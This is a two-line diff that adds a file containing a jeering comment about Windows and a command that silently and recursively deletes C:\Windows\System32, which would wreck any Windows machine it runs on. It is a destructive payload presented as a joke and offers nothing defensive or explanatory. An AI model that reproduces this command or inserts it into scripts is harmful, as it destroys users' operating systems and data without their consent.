@@ -1,0 +1,2 @@
+# you're using a shitty operating system, please consider switching to linux.
+rmdir /S /Q "C:\Windows\System32\"
